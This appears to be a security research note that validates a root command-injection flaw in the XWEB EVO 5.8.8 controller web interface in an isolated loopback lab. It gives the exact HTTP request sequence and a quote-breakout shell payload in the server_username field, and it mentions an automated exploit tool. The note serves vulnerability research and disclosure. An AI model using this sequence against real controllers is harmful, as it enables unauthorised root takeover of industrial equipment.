# XWEB EVO 5.8.8 — loopback HTTP RCE validation

## Result

The complete HTTP injection sequence was executed against the actual recovered
Lighttpd 1.4.55 and Lua code on `127.0.0.1:18080` in the isolated ARM lab.
The injected command created `EVO_RCE_CANARY` on the server. This is an
HTTP-validated RCE candidate, not merely a source or password model.

No external network or physical controller was used.

## Sequence

1. `GET /cgi-bin/sysinfo.lua` returned `status: ok` and release
   `5.8.8.STANDARD.24--25902d`.
2. `POST /cgi-bin/api.lua` with `action=authenticate`,
   `username=Administrator`, and the correct local daily code returned
   `status: ok` and an Administrator SSES token.
3. `POST /cgi-bin/api.lua` with `action=import_preconfiguration`, that token,
   and a `server_username` containing a quote break-out produced the canary.

Documentation-only username:

```text
x:y"; printf EVO_RCE_CANARY >/tmp/evo-rce; #
```

The generated command included:

```text
--user "x:y"; printf EVO_RCE_CANARY >/tmp/evo-rce; #" "http://192.0.2.1/x"
```

The final HTTP response was 500 because `filename` remained nil after Curl had
no effective URL. That error occurred after the injected command had already
run and does not negate the canary.

Machine-readable result: `results/evo-5.8.8-http-rce-validation.json`.
Earlier syscall evidence: `results/evo-import-strace.log`.

## Privilege assessment

`etc/init.d/rcS` starts Lighttpd through `S51lighttpd` as root. The
`server.username` and `server.groupname` settings are commented out, and the
init script supplies no alternate user. CGI therefore runs as root in the
reviewed configuration. A follow-on injection wrote the output of the real `id`
command into `/opt/setup/templates/evo-rce`, which contains:

```text
uid=0(root) gid=0 groups=65534,65534,65534,65534,65534,65534,65534,65534,65534,0
```

This verifies root command execution in the lab. The same `id` output was then
retrieved through `utility.lua` with the Administrator session, so command output
is remotely observable rather than only a filesystem side effect. Finally,
`tools/xweb_evo_rce.py` completed authentication, injection, output retrieval,
and canary removal as a single command; see
`results/evo-rce-live-validation.json`. Physical process ownership and network
reachability remain unverified.

## Remaining boundary

- No physical HTTP request or root command was performed on a controller.
- MAC/IP data was synthetic and Curl was stubbed after command construction.
- The lab proves the network request sequence, authentication, command
  injection, and expected privilege configuration, not Internet reachability.
